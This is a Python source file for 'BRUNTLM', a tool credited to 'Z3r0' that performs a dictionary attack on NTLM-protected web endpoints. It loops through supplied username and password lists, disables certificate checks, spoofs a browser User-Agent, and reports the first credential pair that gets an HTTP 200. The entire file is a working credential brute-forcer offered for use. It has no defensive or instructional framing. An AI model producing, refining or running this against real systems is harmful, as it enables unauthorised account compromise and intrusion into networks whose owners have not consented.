import sys
import requests
import certifi
import os
import codecs
import optparse
import requests
from requests_toolbelt.utils import dump
from requests_ntlm import HttpNtlmAuth
from colorama import Fore, Back, Style
import ssl
import time

Tversion = 'VERSION 1.0.1'
userFile = []
passFile = []

requests.packages.urllib3.disable_warnings()
#requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS = 'RC4-MD5'

def netcheck():
   try:
      teaddr = 'google.com'
      requn = requests.get('https://'+teaddr, timeout = 30)
      # HTTP errors are not raised by default, this statement does that
      stC = requn.status_code
      if (stC != 404):
           return True
        #requn.raise_for_status()
   except requests.HTTPError as e:
        print(Fore.YELLOW + "Checking internet connection failed, status code {0}.".format(e.response.status_code))
   except requests.ConnectionError:
        print(Fore.YELLOW + "No internet connection available.")
   return False

def targcheck(taaddr):
   try:
      reques = requests.get(taaddr , verify = False)#reques = requests.get(taaddr,auth=HttpNtlmAuth('test','test'))#
      # HTTP errors are not raised by default, this statement does that
      stCode = reques.status_code
      if (stCode != 404):
         return True
      #reques.raise_for_status()
   except requests.HTTPError as e:
      print(Fore.YELLOW + "Checking internet connection failed, status code {0}.".format(e.response.status_code))
   except requests.ConnectionError:
      print(Fore.YELLOW + "There is no connection to Target.")
   return False

def main(addr,uf,pf,delay):

   unum = 0
   pnum = 0
   usname = None
   passwd = None
   DoneJob = False
   Tdown = False
   Ndown = False

   print(Fore.YELLOW + '\n[+]Username File Path: ' + uf)
   print(Fore.YELLOW + '[+]Password File Path: ' + pf)



   ufo = open(uf , 'r')
   ruo = ufo.readlines()
   pfo = open(pf , 'r')
   ppo = pfo.readlines()
   for line in ruo[0:]:
      userFile.append(line) # for ENCODING problem use ' unicode(line , 'utf-8-sig') ' instead of line
   for line in ppo[0:]:
      passFile.append(line)



   try:
      print(Fore.GREEN + '\n[-]Testing with below usernames and passwords:\n')
      while unum < len(userFile):
         print(Fore.GREEN + 'username: ' + userFile[unum])
         while pnum < len(passFile):
            if (netcheck()):
               if (targcheck(addr) == True):
                  print(Fore.GREEN + '\tpassword: ' + passFile[pnum])
                  session = requests.Session()
                  session.headers.update({'User-Agent': 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)'})
                  session.auth = HttpNtlmAuth(userFile[unum],passFile[pnum], session)
                  resp = session.get(addr , verify = False)#'/usr/local/lib/python2.7/dist-packages/certifi/weak.pem')
                  data = resp.reason # data = dump.dump_all(resp)
                  print (Fore.YELLOW + '\t' + data.decode('utf-8') + '\n')
                  time.sleep(float(delay))
               else:
                  Tdown = True
                  unum = unum
                  pnum = pnum
                  print(Fore.YELLOW + 'Your Target Seems Down! ... Waiting for respond ...')
                  while(not targcheck(addr)):
                     targcheck(addr)
                  print(Fore.GREEN + 'CONTINUE ...')
                  break
            else:
               Ndown = True
               unum = unum
               pnum = pnum
               print(Fore.YELLOW + 'Your Network Seems Down! ... Waiting for respond ...')
               while(not netcheck()):
                  netcheck()
               print(Fore.GREEN + 'CONTINUE ...')
               break

            if (resp.status_code == 200):
               usname = userFile[unum]
               passwd = passFile[pnum]
               DoneJob = True
               break
            pnum = pnum + 1
         if (DoneJob):
            break
         if ((Tdown == False) and (Ndown == False)):
            pnum = 0
            unum = unum + 1
         else:
            pnum = pnum
            unum = unum
   except Exception as e:
      print (Fore.RED + 'Failed, Try Again' + '\t< - - - >\t' + '[ ' + str(e) + ' ]')
      print(Style.RESET_ALL)



   if (usname != None and passwd != None):
      print (Fore.CYAN + 'username: ' + usname + '\npassword: ' + passwd)
   else:
      print(Fore.RED + '''SORRY! Couldn't find username and password\n''')


if __name__ == '__main__':
   print (Fore.CYAN + '''
         ____________________ ____ _____________________.____       _____   
         \______   \______   \    |   \      \__    ___/|    |     /     \  
          |    |  _/|       _/    |   /   |   \|    |   |    |    /  \ /  \ 
          |    |   \|    |   \    |  /    |    \    |   |    |___/    Y    |
          |______  /|____|_  /______/\____|__  /____|   |_______ \____|__  |
                 \/        \/                \/                 \/       \/ 
                                                      coded by Z3r0''')
   print(Fore.CYAN+'''
   This BRUNTLM which you can use it to perform dictionary attack
   on NTLM Authenticaion.
   '''+Style.RESET_ALL)
   parser = optparse.OptionParser( version = Tversion )
   parser.add_option("-u" , dest = "addr" , help = "Target URL/IP - Use With http/https | Should Incloud Auth needed path # example: http(s)://test.com/authneeded")
   parser.add_option("-d" , dest = "fu" , help = "Path to File that contains usernames")
   parser.add_option("-p" , dest = "fp" , help = "Path to File that contains passwords")
   parser.add_option("-t" , dest = "delay" , help = "Delay between requests [ in second - Default 100 mls ]")
   options,_ = parser.parse_args()
   if (options.addr and options.fu and options.fp and options.delay):
      main(options.addr,options.fu,options.fp,options.delay)
      sys.exit()
   elif (options.addr and options.fu and options.fp and not options.delay):
      print(Fore.YELLOW + 'Default Delay [ 100 mls ]')
      main(options.addr,options.fu,options.fp,.1)
      sys.exit()
   else:
      print(Fore.RED+'CHECK ENTERED ARGUMENTS\n'+Style.RESET_ALL)
      parser.print_help()
      print(Style.RESET_ALL)
